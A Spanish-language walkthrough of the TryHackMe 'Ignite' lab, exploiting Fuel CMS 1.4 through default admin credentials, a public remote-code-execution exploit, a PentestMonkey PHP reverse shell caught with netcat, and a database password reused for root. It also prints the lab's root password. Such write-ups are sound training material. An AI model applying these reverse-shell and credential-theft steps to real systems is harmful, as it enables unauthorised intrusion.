# Guía de Explotación - TryHackMe Ignite

## Reconocimiento

Iniciamos con un escaneo Nmap para identificar los puertos abiertos, versiones de servicios y demás información relevante:

``nmap -T4 --min-rate=10000 -p- -A IP_MAQUINA_ATACADA``

Explicación de los parámetros:
1. `-T4` -> Define la velocidad del escaneo.
2. `--min-rate=10000` -> Envía al menos 10,000 paquetes por segundo.
3. `-p-` -> Escanea todos los puertos disponibles.
4. `-A` -> Activa un escaneo agresivo para obtener más información.

![Imagen1](/Iginite/assets/2025-02-06%2018_06_24-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

El escaneo revela que el único puerto abierto es el **80/tcp**, donde se ejecuta un servidor web Apache con **Fuel CMS**. Además, el archivo `robots.txt` indica que la página de inicio de sesión del CMS se encuentra en `/fuel`.

## Explotación de la Web

Accedemos al sitio web en el puerto 80:

![Imagen2](/Iginite/assets/Captura%20de%20pantalla%202025-02-06%20194100.png)

Desde la página principal de Fuel CMS, intentamos iniciar sesión con las credenciales por defecto ``admin:admin``

`http://DIRECCION_DE_LA_WEB_ATACADA/fuel`

![Imagen3](/Iginite/assets/2025-02-06%2018_08_44-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

El sesión es exitoso, por lo que accederemos al panel de control:

![Imagen4](/Iginite/assets/2025-02-06%2018_09_24-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

Al hacer clic en "Click here for your site documentation", obtenemos la versión del CMS instalada, en este caso, **Fuel CMS 1.4**.

![Imagen5](/Iginite/assets/2025-02-06%2018_11_28-KaliLinux-Hacking%20-%20VMware%20Workstation.png)

Buscando en Google vulnerabilidades para esta versión, encontramos un exploit para **Fuel CMS 1.4.1**, por lo que lo descargamos.

![Imagen6](</Iginite/assets/2025-02-06 18_14_27-KaliLinux-Hacking - VMware Workstation.png>)

Ejecutamos el exploit con:

``python3 50477.py -u http://DIRECCION_DE_LA_WEB_ATACADA``

![Imagen7](</Iginite/assets/2025-02-06 18_38_46-KaliLinux-Hacking - VMware Workstation.png>)

Descargamos una **reverse shell en PHP** desde PentestMonkey:

``wget http://pentestmonkey.net/tools/php-reverse-shell/php-reverse-shell-1.0.tar.gz``

![Imagen8](</Iginite/assets/2025-02-06 18_41_01-KaliLinux-Hacking - VMware Workstation.png>)

Extraemos y editamos el archivo `.php`, reemplazando la IP y el puerto:

```php
$ip = "IP_MAQUINA_ATACANTE";
$port = "PUERTO_LIBRE";
```

![Imagen9](</Iginite/assets/2025-02-06 18_42_44-KaliLinux-Hacking - VMware Workstation.png>)

Levantamos un servidor web en nuestra máquina atacante:

``python3 -m http.server 80``

![Imagen10](</Iginite/assets/2025-02-06 18_48_50-KaliLinux-Hacking - VMware Workstation.png>)

Desde el servidor comprometido, descargamos la reverse shell:

![Imagen11](</Iginite/assets/2025-02-06 18_50_09-KaliLinux-Hacking - VMware Workstation.png>)

Antes de ejecutarla, ponemos en escucha nuestro puerto con Netcat:

``nc -nlvp PUERTO_CONFIGURADO``

![Imagen12](</Iginite/assets/2025-02-06 19_01_48-KaliLinux-Hacking - VMware Workstation.png>)

Ejecutamos la reverse shell accediendo desde el navegador:

``http://DIRECCION_DE_LA_WEB_ATACADA/NOMBRE_ARCHIVO_REVERSE_SHELL``

![Imagen13](</Iginite/assets/2025-02-06 19_07_51-KaliLinux-Hacking - VMware Workstation.png>)

## Comprometiendo la Máquina

Si todo ha funcionado correctamente, obtenemos acceso como `www-data` en el sistema remoto:

``whoami``

![Imagen14](</Iginite/assets/2025-02-06 19_08_15-KaliLinux-Hacking - VMware Workstation.png>)

Para mejorar la shell, ejecutamos:

```sh
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
<CTRL> + Z
stty raw -echo; fg
```

![Imagen15](</Iginite/assets/2025-02-06 19_09_34-KaliLinux-Hacking - VMware Workstation.png>)

Buscamos la primera flag dentro del **home** del usuario comprometido `www-data`:

``cat flag.txt``

![Imagen16](</Iginite/assets/2025-02-06 19_10_53-KaliLinux-Hacking - VMware Workstation.png>)

## Escalada de Privilegios

Revisamos la configuración de Fuel CMS en:

``fuel/application/config/database.php``

![Imagen17](</Iginite/assets/2025-02-06 19_11_51-KaliLinux-Hacking - VMware Workstation.png>)

Extraemos la contraseña con:

``cat database.php | grep "pass"``

![Imagen18](</Iginite/assets/2025-02-06 19_16_22-KaliLinux-Hacking - VMware Workstation.png>)

Probamos la contraseña con `su -` para obtener acceso root:

``su -``

Ingresamos la contraseña obtenida (`mememe`).

![Imagen19](</Iginite/assets/2025-02-06 19_19_22-KaliLinux-Hacking - VMware Workstation.png>)

Ya como root, buscamos y mostramos la flag final:

``cat /root/root.txt``

![Imagen20](</Iginite/assets/2025-02-06 19_19_53-KaliLinux-Hacking - VMware Workstation.png>)

¡Máquina comprometida con éxito!

